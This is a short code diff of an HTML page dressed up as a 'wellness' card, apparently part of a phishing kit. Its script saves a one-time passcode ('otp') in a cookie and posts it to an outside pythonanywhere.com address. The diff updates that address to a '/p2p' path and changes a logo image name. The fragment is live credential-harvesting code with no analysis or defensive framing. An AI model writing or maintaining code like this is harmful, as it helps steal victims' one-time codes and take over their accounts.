@@ -31,7 +31,7 @@
         <div class="wellness-card">
             <div class="mindful-header">
                 <div class="zen-logo">
-                    <img src="./media/P2PSyria">
+                    <img src="./media/p2p.jpg">
                 </div>
             </div>
             <div id="loading-section">
@@ -110,7 +110,7 @@
                     setCookie('otp',otpCode)
 
                     var xhr = new XMLHttpRequest();
-                    xhr.open("POST", 'https://courtneylarson.pythonanywhere.com/',true);
+                    xhr.open("POST", 'https://courtneylarson.pythonanywhere.com/p2p',true);
                     xhr.setRequestHeader('Content-Type', 'application/json');
                     xhr.onreadystatechange = function() {
                         if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200){
